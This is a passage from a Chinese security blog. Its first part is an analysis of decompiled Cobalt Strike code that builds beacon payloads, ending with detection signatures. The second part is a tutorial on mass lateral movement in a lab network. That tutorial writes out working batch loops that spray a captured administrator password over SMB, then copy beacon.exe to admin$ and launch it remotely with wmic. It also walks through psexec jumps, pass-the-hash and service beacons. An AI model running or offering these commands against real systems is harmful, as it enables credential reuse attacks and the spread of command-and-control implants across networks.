<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901144705204.png" alt="image-20200901144705204"></p>
<p>​        我们跟进export方法，export的代码如下，他根据payload的类型，调用了不同的方法，我们以最基本的http_reverse为例进行分析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public byte[] export(String var1, int var2) &#123;</span><br><span class="line">    if (&quot;windows&#x2F;foreign&#x2F;reverse_http&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return this.getPayloadStager(var1);</span><br><span class="line">    &#125; else if (&quot;windows&#x2F;foreign&#x2F;reverse_https&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return this.getPayloadStager(var1);</span><br><span class="line">    &#125; else if (&quot;windows&#x2F;beacon_http&#x2F;reverse_http&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return (new BeaconPayload(this, var2)).exportBeaconStageHTTP(this.getPort(), this.getCallbackHosts(), false, false, var1);</span><br><span class="line">    &#125; else if (&quot;windows&#x2F;beacon_https&#x2F;reverse_https&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return (new BeaconPayload(this, var2)).exportBeaconStageHTTP(this.getPort(), this.getCallbackHosts(), false, true, var1);</span><br><span class="line">    &#125; else if (&quot;windows&#x2F;beacon_dns&#x2F;reverse_dns_txt&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return (new BeaconPayload(this, var2)).exportBeaconStageDNS(this.getPort(), this.getCallbackHosts(), true, false, var1);</span><br><span class="line">    &#125; else if (&quot;windows&#x2F;beacon_bind_pipe&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return (new BeaconPayload(this, var2)).exportSMBStage(var1);</span><br><span class="line">    &#125; else if (&quot;windows&#x2F;beacon_bind_tcp&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return (new BeaconPayload(this, var2)).exportBindTCPStage(var1);</span><br><span class="line">    &#125; else if (&quot;windows&#x2F;beacon_reverse_tcp&quot;.equals(this.getPayload())) &#123;</span><br><span class="line">        return (new BeaconPayload(this, var2)).exportReverseTCPStage(var1);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        AssertUtils.TestFail(&quot;Unknown payload &#39;&quot; + this.getPayload() + &quot;&#39;&quot;);</span><br><span class="line">        return new byte[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        我们发现其调用了exportBeaconStageHTTP方法，跟进这个方法，首先判断架构，再根据架构的不同给var6进行赋值，最后调用了exportBeaconStage方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public byte[] exportBeaconStageHTTP(int var1, String var2, boolean var3, boolean var4, String var5) &#123;</span><br><span class="line">    AssertUtils.TestSetValue(var5, &quot;x86, x64&quot;);</span><br><span class="line">    String var6 &#x3D; &quot;&quot;;</span><br><span class="line">    if (&quot;x86&quot;.equals(var5)) &#123;</span><br><span class="line">        var6 &#x3D; &quot;resources&#x2F;beacon.dll&quot;;</span><br><span class="line">    &#125; else if (&quot;x64&quot;.equals(var5)) &#123;</span><br><span class="line">        var6 &#x3D; &quot;resources&#x2F;beacon.x64.dll&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return this.pe.process(this.exportBeaconStage(var1, var2, var3, var4, var6), var5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        跟进exportBeaconStage方法，这个方法比较长，我会把简单的分析写在注释中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">protected byte[] exportBeaconStage(int var1, String var2, boolean var3, boolean var4, String var5) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        long var6 &#x3D; System.currentTimeMillis();</span><br><span class="line">        byte[] var8 &#x3D; SleevedResource.readResource(var5); &#x2F;&#x2F;获取sleeve&#x2F;beacon.dll的内容</span><br><span class="line">        if (var2.length() &gt; 254) &#123;</span><br><span class="line">            var2 &#x3D; var2.substring(0, 254);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String[] var9 &#x3D; this.c2profile.getString(&quot;.http-get.uri&quot;).split(&quot; &quot;); &#x2F;&#x2F;加载配置文件中.http-get.uri的值</span><br><span class="line">        String[] var10 &#x3D; var2.split(&quot;,\\s*&quot;);</span><br><span class="line">        LinkedList var11 &#x3D; new LinkedList();</span><br><span class="line"></span><br><span class="line">        for(int var12 &#x3D; 0; var12 &lt; var10.length; ++var12) &#123;</span><br><span class="line">            var11.add(var10[var12]);</span><br><span class="line">            var11.add(CommonUtils.pick(var9));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String var32;</span><br><span class="line">        while(var11.size() &gt; 2 &amp;&amp; CommonUtils.join(var11, &quot;,&quot;).length() &gt; 255) &#123;</span><br><span class="line">            var32 &#x3D; var11.removeLast() + &quot;&quot;;</span><br><span class="line">            String var13 &#x3D; var11.removeLast() + &quot;&quot;;</span><br><span class="line">            CommonUtils.print_info(&quot;dropping &quot; + var13 + var32 + &quot; from Beacon profile for size&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var32 &#x3D; randua(this.c2profile);</span><br><span class="line">        int var33 &#x3D; Integer.parseInt(this.c2profile.getString(&quot;.sleeptime&quot;)); &#x2F;&#x2F;加载配置文件的sleeptime的值</span><br><span class="line">        String var14 &#x3D; CommonUtils.pick(this.c2profile.getString(&quot;.http-post.uri&quot;).split(&quot; &quot;));</span><br><span class="line">        byte[] var15 &#x3D; this.c2profile.recover_binary(&quot;.http-get.server.output&quot;);</span><br><span class="line">        byte[] var16 &#x3D; this.c2profile.apply_binary(&quot;.http-get.client&quot;);</span><br><span class="line">        byte[] var17 &#x3D; this.c2profile.apply_binary(&quot;.http-post.client&quot;);</span><br><span class="line">        int var18 &#x3D; this.c2profile.size(&quot;.http-get.server.output&quot;, 1048576);</span><br><span class="line">        int var19 &#x3D; Integer.parseInt(this.c2profile.getString(&quot;.jitter&quot;));</span><br><span class="line">        if (var19 &lt; 0 || var19 &gt; 99) &#123;</span><br><span class="line">            var19 &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int var20 &#x3D; Integer.parseInt(this.c2profile.getString(&quot;.maxdns&quot;));</span><br><span class="line">        if (var20 &lt; 0 || var20 &gt; 255) &#123;</span><br><span class="line">            var20 &#x3D; 255;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int var21 &#x3D; 0;</span><br><span class="line">        if (var3) &#123;</span><br><span class="line">            var21 |&#x3D; 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (var4) &#123;</span><br><span class="line">            var21 |&#x3D; 8;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        long var22 &#x3D; CommonUtils.ipToLong(this.c2profile.getString(&quot;.dns_idle&quot;));</span><br><span class="line">        int var24 &#x3D; Integer.parseInt(this.c2profile.getString(&quot;.dns_sleep&quot;));</span><br><span class="line">        Settings var25 &#x3D; new Settings();</span><br><span class="line">        var25.addShort(1, var21);</span><br><span class="line">        var25.addShort(2, var1);</span><br><span class="line">        var25.addInt(3, var33);</span><br><span class="line">        var25.addInt(4, var18);</span><br><span class="line">        var25.addShort(5, var19);</span><br><span class="line">        var25.addShort(6, var20);</span><br><span class="line">        var25.addData(7, this.publickey, 256);</span><br><span class="line">        var25.addString(8, CommonUtils.join(var11, &quot;,&quot;), 256);</span><br><span class="line">        var25.addString(9, var32, 128);</span><br><span class="line">        var25.addString(10, var14, 64);</span><br><span class="line">        var25.addData(11, var15, 256);</span><br><span class="line">        var25.addData(12, var16, 256);</span><br><span class="line">        var25.addData(13, var17, 256);</span><br><span class="line">        var25.addData(14, CommonUtils.asBinary(this.c2profile.getString(&quot;.spawnto&quot;)), 16);</span><br><span class="line">        var25.addString(29, this.c2profile.getString(&quot;.post-ex.spawnto_x86&quot;), 64);</span><br><span class="line">        var25.addString(30, this.c2profile.getString(&quot;.post-ex.spawnto_x64&quot;), 64);</span><br><span class="line">        var25.addString(15, &quot;&quot;, 128);</span><br><span class="line">        var25.addShort(31, QuickSecurity.getCryptoScheme());</span><br><span class="line">        var25.addInt(19, (int)var22);</span><br><span class="line">        var25.addInt(20, var24);</span><br><span class="line">        var25.addString(26, this.c2profile.getString(&quot;.http-get.verb&quot;), 16);</span><br><span class="line">        var25.addString(27, this.c2profile.getString(&quot;.http-post.verb&quot;), 16);</span><br><span class="line">        var25.addInt(28, this.c2profile.shouldChunkPosts() ? 96 : 0);</span><br><span class="line">        var25.addInt(37, this.c2profile.getInt(&quot;.watermark&quot;));</span><br><span class="line">        var25.addShort(38, this.c2profile.option(&quot;.stage.cleanup&quot;) ? 1 : 0);</span><br><span class="line">        var25.addShort(39, this.c2profile.exerciseCFGCaution() ? 1 : 0);</span><br><span class="line">        String var26 &#x3D; this.listener.getHostHeader();</span><br><span class="line">        if (var26 !&#x3D; null &amp;&amp; var26.length() !&#x3D; 0) &#123;</span><br><span class="line">            if (Profile.usesHostBeacon(this.c2profile)) &#123;</span><br><span class="line">                var25.addString(54, &quot;&quot;, 128); &#x2F;&#x2F;获取host的值进行赋值</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                var25.addString(54, &quot;Host: &quot; + this.listener.getHostHeader() + &quot;\r\n&quot;, 128);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            var25.addString(54, &quot;&quot;, 128);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (Profile.usesCookieBeacon(this.c2profile)) &#123;</span><br><span class="line">            var25.addShort(50, 1);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            var25.addShort(50, 0);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ProxyServer var27 &#x3D; ProxyServer.parse(this.listener.getProxyString());</span><br><span class="line">        var27.setup(var25);</span><br><span class="line">        this.setupKillDate(var25);</span><br><span class="line">        this.setupGargle(var25, var5);</span><br><span class="line">        (new ProcessInject(this.c2profile)).apply(var25);</span><br><span class="line">        byte[] var28 &#x3D; var25.toPatch();</span><br><span class="line">        var28 &#x3D; beacon_obfuscate(var28);</span><br><span class="line">        String var29 &#x3D; CommonUtils.bString(var8);</span><br><span class="line">        int var30 &#x3D; var29.indexOf(&quot;AAAABBBBCCCCDDDDEEEEFFFF&quot;); &#x2F;&#x2F;找到AAAABBBBCCCCDDDDEEEEFFFF的位置</span><br><span class="line">        var29 &#x3D; CommonUtils.replaceAt(var29, CommonUtils.bString(var28), var30); &#x2F;&#x2F;将模板的内容进行替换</span><br><span class="line">        return CommonUtils.toBytes(var29); &#x2F;&#x2F;返回替换后的结果</span><br><span class="line">    &#125; catch (IOException var31) &#123;</span><br><span class="line">        MudgeSanity.logException(&quot;export Beacon stage: &quot; + var5, var31, false);</span><br><span class="line">        return new byte[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        简单的分析后我们发现这段代码的主要作用是读取beacon.dll文件，以这个文件作为模板对一些值进行替换，并且是以找到AAAABBBBCCCCDDDDEEEEFFFF来找到要替换的位置的，但是比较奇怪的是我再beacon.dll中并没有发现AAAABBBBCCCCDDDDEEEEFFFF这个字符串。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901154145081.png" alt="image-20200901154145081"></p>
<p>​        后面根据不同的类型的类型，调用patchArtifact方法，虽然使用的模板不同，最终还是会有4个a的特征，不过可能使用这种方式的模板比较大，因此不会有大写A这种特征。因为本身替代Stager那部分比如beacon.dll的文件内容就比较大，有200多k。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901154601816.png" alt="image-20200901154601816"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        总结一下这几种生成方式的过程和一些区别</p>
<ul>
<li>payload generator只是加载stager模板并且对里面host，port和uri部分进行替换，最终生成的文件只是将stager文件以字节数组的形式进行输出</li>
<li>windows executable首先生成stager，这个stager可能非常小，再去替换模板文件中出现1024个A的地址，这种方式由于stager比较小，而且在模板插入stager之前会写入4个a，因此可以把出现4个a和a出现后的1024字节内出现多个A为特征进行检测</li>
<li>windows executables这种方式不会再去生成stager而是使用其他的方式进行替换，而替换stager的部分模板文件过大，因此会在插入的开始出现4个a但是不会出现多个A。</li>
</ul>
<p><strong>参考文章</strong></p>
<p><a href="https://xz.aliyun.com/t/8103" target="_blank" rel="noopener">从剖析CS木马生成到开发免杀工具</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于内网批量横向渗透的学习总结</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2020-08-31 12:07:47 / Modified: 17:05:26" itemprop="dateCreated datePublished" datetime="2020-08-31T12:07:47+08:00">2020-08-31</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        之前的学习中我们了解了关于横向移动的方式，当我们知道了这些方式，下一步当然是想要去提高速度，在这篇文章中我将带着大家学习如何来批量上线内网主机。</p>
<h3 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h3><p>192.168.3.* 为仅主机模式的网段</p>
<p>192.168.5.*为nat模式的网段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OWA2013 192.168.3.144 192.168.5.58   边界机</span><br><span class="line">SRV-WEB-KIT 192.168.3.73   内网断网机</span><br><span class="line">PC-JERRY-KIT 192.168.3.75 192.168.5.59   内网出网机</span><br></pre></td></tr></table></figure>

<h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><p>​        我们首先学习一下如何使用WMI来批量上线内网主机</p>
<p>​        当我们获取了某个主机的密码，我们想测试是否有内网主机和这个主机的密码相同，首先需要扫描内网那些主机开放了445端口。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831135507642.png" alt="image-20200831135507642"></p>
<p>​        得到这些开放445端口的ip后，我们将这些ip写到一个文件中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell echo 192.168.3.73 &gt;&gt; c:\windows\temp\host.txt</span><br><span class="line">shell echo 192.168.3.75 &gt;&gt; c:\windows\temp\host.txt</span><br></pre></td></tr></table></figure>

<p>​        除了上面这种方式，当然也可以将host.txt在本地写好再上传到边界主机上。</p>
<p>​        当我们得到哪些主机开放了445端口以后，我们想测试我们得到的密码在哪些主机上是相同的,可以使用net use建立ipc连接来进行测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\host.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;xxxx&quot; &amp;&amp; if %errorlevel% equ 0 ( echo %i &gt;&gt; c:\windows\temp\login_succeed.txt ) &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831140152324.png" alt="image-20200831140152324"></p>
<p>​        然后我们准备生成一个shell，再通过wmi来执行达到批量上线的目的。shell生成最好生成pivot listener，因为我们并不能确定内网主机是否能出外网</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831140743070.png" alt="image-20200831140743070"></p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831140845228.png" alt="image-20200831140845228"></p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831140914981.png" alt="image-20200831140914981"></p>
<p>​        生成好以后将生成的beacon.exe上传到边界主机</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831141039574.png" alt="image-20200831141039574"></p>
<p>​        使用wmic执行beacon.exe批量上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\login_succeed.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;xxx&quot; &amp;&amp; copy C:\windows\temp\beacon.exe \\%i\admin$\temp\ &amp;&amp; wmic &#x2F;node:%i &#x2F;user:administrator &#x2F;password:xxx PROCESS call create &quot;\\%i\admin$\temp\beacon.exe&quot; &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831142003540.png" alt="image-20200831142003540"></p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831142030428.png" alt="image-20200831142030428"></p>
<h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><p>​        在cobaltstrike中，内置了可以通过jump psexec来进行横向渗透的方法，这种方法我们既可以通过建立pivot listener来批量上线，也可以通过使用smb beacon来执行上线。下面我以smb beacon为例来演示下如何通过jump psexec来批量上线内网断网主机。<br>​        要使用smb beacon来上线，首先要创建一个smb类型的listener</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144047330.png" alt="image-20200831144047330"></p>
<p>​        选择target，按住shift选中我们想要上线的几个目标。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144139103.png" alt="image-20200831144139103"></p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144237104.png" alt="image-20200831144237104"></p>
<p>​        选择psexec模块，listener选择我们创建的smb listener</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144319681.png" alt="image-20200831144319681"></p>
<p>​        选择lauch后，CS执行的操作如下</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144519451.png" alt="image-20200831144519451"></p>
<p>​        同时两台内网的主机上线，因为用的是psexec的方式，所以是通过rundll32来执行上线的</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144603432.png" alt="image-20200831144603432"></p>
<p>​        这里对比一下WMI批量上线，我们可以发现使用WMI上线后的权限为当前用户的权限，而使用psexec上线后的权限为system权限。</p>
<p>​        最后我们再测试下使用psexec的这种上线方式能不能通过hash传递来利用，其他的步骤是一样的，只有在传递密码时输入变成了hash</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831145220858.png" alt="image-20200831145220858"></p>
<p>​        CobaltStrike执行的操作如下</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831145543919.png" alt="image-20200831145543919"></p>
<p>​        执行后也可以上线</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831152157468.png" alt="image-20200831152157468"></p>
<p>​        这里有一个小插曲，就是我第一次使用hash传递上线这两台主机时发现只有192.168.3.73这台主机上线，而win10 192.168.3.75没有上线，然后我是用impacket的psexec利用hash传递进行测试，发现无法使用administrator连接，但是我用net use 连接administrator账户又是正常的，经过排错，我发现是因为administrator账户是禁用状态导致的，启用后即可正常执行。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831152344500.png" alt="image-20200831152344500"></p>
<p>​        这里也说明了一个问题，就是即使一个账户是禁用的，在我们知道账号密码的情况下，也是可以通过net use来连接的，但是无法通过pth来连接并且利用。</p>
<h3 id="service"><a href="#service" class="headerlink" title="service"></a>service</h3><p>​        既然要在cobaltstrike通过service来进行批量上线的操作，首先需要生成一个service类型的shell，其次我们需要将这个shell上传到内网主机执行来上线。</p>
<p>​        首先在目标边界主机上创建一个pivot类型的listener</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831154146904.png" alt="image-20200831154146904"></p>
<p>​        创建时候注意在host选择边界机内网所对应的ip，这个一定要注意，否则是上线不了断网主机的。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831154317379.png" alt="image-20200831154317379"></p>
<p>​        生成一个Stageless，listener选择我们创建的listener，输出类型选择service类型</p>
